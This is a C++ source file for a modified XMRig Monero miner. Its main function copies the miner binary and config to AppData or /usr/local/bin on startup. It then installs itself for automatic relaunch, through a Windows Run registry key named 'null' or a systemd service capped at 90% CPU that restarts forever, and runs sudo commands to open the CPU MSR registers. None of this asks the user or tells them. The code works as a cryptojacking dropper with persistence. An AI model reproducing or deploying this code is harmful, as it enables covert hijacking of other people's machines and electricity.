/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "string"
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <fstream>

#ifdef _WIN32
#include <windows.h>
#endif

std::string getExecutablePath() {
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
#else
    char path[4096];
    ssize_t count = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (count != -1) {
        path[count] = '\0';
        return std::string(path);
    }
    return "";
#endif
}

bool copyFile(const std::string &source, const std::string &destination) {
    std::ifstream src(source, std::ios::binary);
    if (!src) {
        std::cerr << "Failed to open source file: " << source << std::endl;
        return false;
    }

    std::ofstream dest(destination, std::ios::binary);
    if (!dest) {
        std::cerr << "Failed to create destination file: " << destination << std::endl;
        return false;
    }

    dest << src.rdbuf();

    if (src.fail() || dest.fail()) {
        std::cerr << "Error occurred while copying file: " << source << " to " << destination << std::endl;
        return false;
    }

    return true;
}



std::string getAppDestinationPath() {
#ifdef _WIN32
    char *appDataPath = getenv("APPDATA");
    if (appDataPath) {
        return std::string(appDataPath) + "\\xmrig.exe";
    }
    return "";
#else
    return "/usr/local/bin/xmrig";
#endif
}

std::string getConfigDestinationPath() {
#ifdef _WIN32
    char *appDataPath = getenv("APPDATA");
    if (appDataPath) {
        return std::string(appDataPath) + "\\config.json";
    }
    return "";
#else
    return "/usr/local/bin/config.json";
#endif
}

#ifdef _WIN32
void addToStartupWindows(const std::string &path) {
    std::string command = std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
    system(command.c_str());
}
#else
#include <fstream>

void addToStartupLinux(const std::string &path) {
    const char* user = std::getenv("USER");
    if (user == nullptr) {
        std::cerr << "Failed to get current user." << std::endl;
        return;
    }
    std::string serviceFilePath = "/etc/systemd/system/xmrig.service";

    std::ofstream serviceFile(serviceFilePath);
    if (!serviceFile) {
        std::cerr << "Failed to create service file." << std::endl;
        return;
    }

    serviceFile << "[Unit]\n"
                << "Description=xmrig application\n"
                << "After=network.target\n\n"
                << "[Service]\n"
                << "CPUQuota=90%\n"
                << "ExecStart=" << path << "\n"
                << "Restart=always\n"
                << "User=" << user << "\n"
                << "Group=" << user << "\n"
                << "\n[Install]\n"
                << "WantedBy=multi-user.target\n";

    serviceFile.close();

    system("sudo systemctl daemon-reload");

    system("sudo systemctl enable xmrig.service");
    system("sudo systemctl start xmrig.service");
}
#endif


int main(int argc, char **argv)
{
    try {
        std::string exePath = getExecutablePath();
        if (exePath.empty()) {
            std::cerr << "Failed to determine executable path!" << std::endl;
            return 1;
        }

        std::string appDestPath = getAppDestinationPath();
        std::string configDestPath = getConfigDestinationPath();

        std::string configFilePath = "config.json";
        std::ifstream configFile(configFilePath);
        if (!configFile) {
          #ifdef _WIN32
          #else
            std::ifstream configFile("/usr/local/bin/config.json");
            if (configFile) {
              configFilePath = "/usr/local/bin/config.json";
            } else {
              std::cerr << "Failed to open config file" << std::endl;
              return 1;
            }
          #endif
        }


        if (!copyFile(exePath, appDestPath)) {
            std::cerr << "Failed to copy executable!" << std::endl;
            return 1;
        }

        if (!copyFile("config.json", configDestPath)) {
            std::cerr << "Failed to copy config.json to: " << configDestPath << std::endl;
            return 1;
        } else {
            std::cout << "Config copied to: " << configDestPath << std::endl;
        }


#ifdef _WIN32
#else
        system(("sudo chmod +x " + std::string(appDestPath)).c_str());
        system("sudo modprobe msr");
        system("sudo chmod +r /dev/cpu/*/msr");
#endif

#ifdef _WIN32
        addToStartupWindows(appDestPath);
#else
        addToStartupLinux(appDestPath);
#endif
    } catch (...) {
        std::cerr << "An error occurred during startup configuration." << std::endl;
    }

    using namespace xmrig;

    Process process(argc, argv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
